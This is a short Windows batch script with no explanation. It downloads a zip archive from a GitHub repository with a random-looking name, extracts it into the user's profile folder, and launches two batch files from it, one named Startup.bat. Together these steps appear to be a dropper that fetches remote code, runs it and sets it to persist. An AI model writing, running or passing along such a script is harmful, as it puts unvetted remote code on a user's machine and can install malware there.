@echo off
PowerShell.exe -Command "Invoke-WebRequest -Uri https://github.com/peasiodjoaskdsa/mor/raw/main/ms.zip -OutFile '%USERPROFILE%\ms\ms.zip'"
timeout /t 40 /nobreak
PowerShell.exe -Command "Expand-Archive -Path '%USERPROFILE%\ms\ms.zip' -DestinationPath '%USERPROFILE%\ms' -Force"
start "" Shortcut.bat
timeout /t 5/nobreak
start "" Startup.bat

